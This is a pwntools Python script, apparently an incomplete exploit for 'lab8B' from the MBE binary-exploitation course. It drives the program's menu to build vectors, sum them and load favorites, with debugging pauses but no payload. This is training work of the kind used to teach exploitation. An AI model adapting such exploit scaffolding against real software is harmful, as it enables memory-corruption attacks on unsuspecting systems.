# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "/tmp/lab8B",
}
# Exploit here
def exploit():

    # v1
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","1") # Action
    p.sendline("1") # Vector number
    # Values go here
    p.sendline(p8(0x1)) #
    p.sendline("1") # 
    p.sendline("1") #
    p.sendline("1")
    p.sendline("1") 
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.recv()		# Flush the output buffer

    # v2
    p.sendline("1") # Action
    p.sendline("2") # Vector number
    p.sendline(p8(0x2)) # 2, this has to go as literal, because the type here is char read by getchar()
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
    p.sendline("2")
	
    # Now we sum them up
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","2")
	
    # Now, we add our sum to favorites 4 times
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","4")

    print("PID: "+str(pidof(p)))
    pause()
    # Load favorite
    p.sendlineafter("I COMMAND YOU TO ENTER YOUR COMMAND: ","6")
    p.sendlineafter("Which favorite? ","3")
    p.sendlineafter("Which vector? ","2")

    pause()
    p.recv()
    pause()
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()